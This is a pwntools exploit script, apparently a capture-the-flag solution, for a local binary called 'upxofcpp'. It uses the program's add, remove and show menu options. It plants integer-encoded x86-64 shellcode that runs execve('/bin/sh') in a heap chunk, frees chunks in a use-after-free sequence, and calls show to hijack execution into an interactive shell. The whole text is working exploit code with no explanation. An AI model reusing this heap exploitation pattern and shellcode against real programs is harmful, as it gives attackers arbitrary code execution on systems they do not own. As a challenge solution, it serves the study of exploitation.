from pwn import *
context.log_level = 'debug'
context.arch = "amd64"
p = process("./upxofcpp")
#p = process("./upxofcppq")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def Add(idx,size,inter):
	p.recvuntil("Your choice:")
	p.sendline("1")
	p.recvuntil("Index:")
	p.sendline(str(idx))
	p.recvuntil("Size:")
	p.sendline(str(size))
	p.recvuntil("stop:")
	p.sendline(inter)
def remove(idx):
	p.recvuntil("Your choice:")
	p.sendline("2")
	p.recvuntil("vec index:")
	p.sendline(str(idx))

def show(idx):
	p.recvuntil("Your choice:")
	p.sendline("4")
	p.recvuntil("vec index:")
	p.sendline(str(idx))

if __name__=='__main__':
	
	Add(0,6,'0 '*4+str(0x4deb90)+' '+str(0xcccccc))	
	Add(1,0x20,'1 '*8 +str(0x3bc0c748)+' '+str(0x50000000)+' '+str(0x50d23148)+' '+str( 0x48f63148)+' '+str(0x69622fbb)+' '+str(0x68732f6e)+' '+str(0x5f545300)+' '+str(0x050f3bb0)+' '+str(-1))
	
	Add(2,0x10,'2 '*0x10)
	Add(3,0x10,'3 '*0x10)
	
	remove(1)
	remove(3)
	remove(2)
	#gdb.attach(p)

	show(2)
	p.interactive()
